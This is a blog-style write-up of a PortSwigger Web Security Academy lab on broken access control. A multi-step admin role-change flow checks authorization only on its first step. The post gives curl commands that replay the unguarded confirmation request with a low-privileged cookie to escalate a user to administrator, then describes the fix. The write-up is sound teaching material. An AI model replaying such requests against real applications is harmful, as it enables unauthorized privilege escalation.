---
layout: post
title: "PortSwigger: Multi-Step Process With No Access Control on One Step"
date: 2027-10-02 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, AccessControl]
tags: [portswigger, access-control, broken-access-control, multi-step, privilege-escalation, cwe-284]
---

The previous labs broke access control by checking the wrong *component* or the wrong *verb*. This one breaks it by checking the wrong *step*. A privileged action is split into a multi-step workflow, the guard sits on the first step, and the step that actually commits the change trusts you completely. ([CWE-284](https://cwe.mitre.org/data/definitions/284.html), Improper Access Control.)

## Overview

Two accounts again: an admin (`administrator:admin`) and a low-privileged user (`wiener:peter`). The admin panel promotes users to administrator, and the goal is to escalate `wiener`.

## The multi-step admin action

Logged in as the admin, promoting a user is **not** a single request. It is a two-stage flow. First you submit the role change:

```
POST /admin-roles
Cookie: session=<admin-session>

username=carlos&action=upgrade
```

The server does not apply the change yet — it returns an **"Are you sure?"** confirmation page containing a hidden form:

```html
<form action="/admin-roles" method="POST">
    <input type="hidden" name="action" value="upgrade">
    <input type="hidden" name="confirmed" value="true">
    <input type="hidden" name="username" value="carlos">
    <button type="submit">Yes</button>
</form>
```

Only when you submit *that* form — the request carrying `confirmed=true` — does the promotion actually happen.

## The flaw

The role check lives on the admin panel and on the first step. The developer assumed that anyone who reaches the confirmation step must have already passed it. But every HTTP request is independent: reaching step two proves nothing about whether step one was authorized for *this* request.

As `wiener`, the admin panel itself is correctly off-limits:

```bash
curl -sk -b wiener_cookies.txt 'https://TARGET/admin' -o /dev/null -w '%{http_code}\n'
# 401
```

But the committing step has no check at all. Replay it with wiener's own session cookie and a target of `wiener`:

```bash
curl -sk -b wiener_cookies.txt 'https://TARGET/admin-roles' \
  --data-urlencode 'action=upgrade' \
  --data-urlencode 'confirmed=true' \
  --data-urlencode 'username=wiener'
# HTTP 302  → wiener is now administrator
```

The 302 redirect is the success signal. The lab flips to **Solved**.

## How to find it

Log in once as the admin and walk the role-change flow while watching the requests. The hidden `confirmed=true` field on the "Are you sure?" page is the tell that the commit is a separate, independent request. Capture that final request, then replay it with a low-privileged cookie and your own username.

## The fix

Authorization must be enforced on **every** step that performs or commits a privileged change, not just the workflow entry point:

```python
@app.route('/admin-roles', methods=['POST'])
@require_role('admin')          # runs on the confirm/commit step too
def admin_roles():
    ...
```

Deny by default, put the access-control check in central middleware keyed to the action so confirmation handlers inherit it, and bind the workflow to a server-side, role-validated state token instead of trusting a client-supplied `confirmed=true` flag.
